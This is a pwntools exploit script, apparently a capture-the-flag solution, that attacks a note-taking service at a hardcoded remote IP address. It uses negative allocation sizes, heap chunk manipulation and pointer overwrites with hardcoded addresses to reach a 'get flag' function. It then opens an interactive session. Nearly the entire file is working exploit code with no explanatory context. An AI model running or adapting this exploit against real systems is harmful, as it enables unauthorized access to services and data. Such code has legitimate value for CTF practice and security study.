import os

from pwn import *



def add(pc, size, title, body):
    pc.sendlineafter('>', '1')
    pc.sendlineafter('>', str(size))
    pc.sendlineafter('>', title)
    pc.sendlineafter('>', body)


def delete(pc, index):
    pc.sendlineafter('>', '2')
    pc.sendlineafter('>', str(index))


def edit(pc, index, title, body):
    pc.sendlineafter('>', '3')
    pc.sendlineafter('>', str(index))
    pc.sendlineafter('>', title)
    pc.sendlineafter('>', body)


def _print(pc, index):
    pc.sendlineafter('>', '4')
    pc.sendlineafter('>', str(index))


def get_flag(pc, index):
    pc.sendlineafter('>', '6')


def main():
    # pc = process('./service1.o')
    pc = remote('51.15.73.163', 8888)

    notes_dir = '\x00\xb0\xfe\xca\x00\x00\x00\x00'
    flag_dir  = '\x38\xb0\xfe\xca\x00\x00\x00\x00'
    flag_addr = '\x69\x0b\x40\x00\x00\x00\x00\x00'
    addr      = '\x60\x20\x60\x00\x00\x00\x00\x00'
    dead_beef = '\x00\xb0\xad\xde\x00\x00\x00\x00'

    real_flag_addr = '\x00\x10\x60\x00\x00\x00\x00\x00'

    add(pc, -70, 'AAAA', '')
    add(pc, -70, 'BBBB', '')
    add(pc, -70, 'CCCC', '')
    add(pc, -70, 'A', '')
    add(pc, -70, 'A', '')

    delete(pc, 3)
    delete(pc, 2)
    delete(pc, 1)
    delete(pc, 0)

    add(pc, -70, 16 * 'C' + '\x00\x00\x00\x00\x00\x00\x00\x00' * 11 + '\x70\x00\x00\x00\x00\x00\x00\x00' + '\x2d\x20\x60\x00\x00\x00\x00\x00', '')

    add(pc, -70, 'AAAA', '')

    add(pc, -70, '\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41' + addr + 'GIMMETHEFLAG\x00\x00\x00\x00' + notes_dir + flag_dir, '')
    edit(pc, 0, 'GIMMETHEFLAG\x00', '')
    edit(pc, 1, '\x00\xb0\xad\xde\x00\x00\x00\x00\x00\x00\x00', '')

    pc.sendline('6')

    _print(pc, 0)

    pc.interactive()


if __name__ == '__main__':
    try:
        os.remove('/dev/shm/notes_dir')
    except Exception:
        pass
    
    main()